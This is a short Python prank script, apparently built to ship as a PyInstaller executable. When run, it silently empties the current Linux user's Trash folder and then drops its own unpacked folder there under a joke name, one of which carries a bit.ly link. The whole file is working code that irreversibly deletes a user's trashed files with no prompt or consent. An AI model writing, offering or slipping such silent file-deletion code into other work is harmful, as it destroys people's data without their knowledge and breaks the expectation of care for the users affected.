import random, os, pwd, shutil, sys

trash_names = ["ILOVETRASH", "RACCOONEATSYOURTRASH", "YOURTRASHWEREDELICIOUS", "NOTRASHNOGRETACOMPLAINS", "DELICIOUS:)", "bit.ly:3yNbA7k"]

#Do you mind to add your trash folder here :) ???
trash_folder = '/home/{}/.local/share/Trash/files'

def main():
    global trash_folder
    filename = sys._MEIPASS
    user = pwd.getpwuid(os.getuid())[0]
    trash_folder = trash_folder.format(user)

    for root, dirs, files in os.walk(trash_folder):
        for f in files:
            os.unlink(os.path.join(root, f))
        for d in dirs:
            shutil.rmtree(os.path.join(root, d))
    
    os.rename(filename, trash_folder + '/' + random.choice(trash_names))
    
    
if __name__ == "__main__":
    main()
